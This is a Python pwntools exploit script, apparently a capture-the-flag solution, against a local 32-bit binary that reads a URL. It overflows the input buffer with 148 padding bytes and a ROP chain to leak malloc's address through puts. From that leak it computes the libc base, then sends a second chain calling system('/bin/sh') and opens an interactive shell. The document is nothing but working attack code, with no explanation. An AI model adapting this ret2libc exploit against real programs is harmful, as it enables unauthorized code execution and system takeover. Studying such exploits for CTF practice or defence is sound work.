from pwn import *
#context.log_level = 'debug'

binary = ELF('./bin')
libc = ELF('libc.so.6')

t = process('./bin')

t.recvuntil('URL: ')

#gdb.attach(t)
rop = ROP(binary)
rop.puts(binary.got['malloc'])
rop.call(0x080485d0)

t.sendline('http://%1\x00' + 'a'*148 + str(rop) + 'lo|')

t.recvline()
malloc = u32(t.recv(4))


#print hex(malloc)
base = malloc - libc.symbols['malloc']
system = base + libc.symbols['system']
sh = base + libc.search('/bin/sh').next()

rop = ROP(binary)
rop.call(system,(sh,))
t.sendline('http://%1\x00' + 'a'*148 + str(rop) + 'lo|')

t.sendline('echo "explorer"')
t.recvuntil('explorer\n')
t.interactive()

